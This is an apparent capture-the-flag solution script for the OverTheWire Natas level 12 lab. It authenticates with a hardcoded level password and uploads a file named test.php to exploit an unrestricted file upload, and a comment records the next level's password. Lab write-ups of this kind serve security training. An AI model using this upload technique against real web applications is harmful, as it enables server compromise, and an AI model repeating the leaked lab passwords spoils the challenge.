import requests
import base64

username="natas12"
password="EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url=str("http://%s.natas.labs.overthewire.org" %username)
r=requests.post(url,auth=(username,password),data={'filename':'test.php'},files={'uploadedfile':open('test.php','rb')})
print(r.text)
# the password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY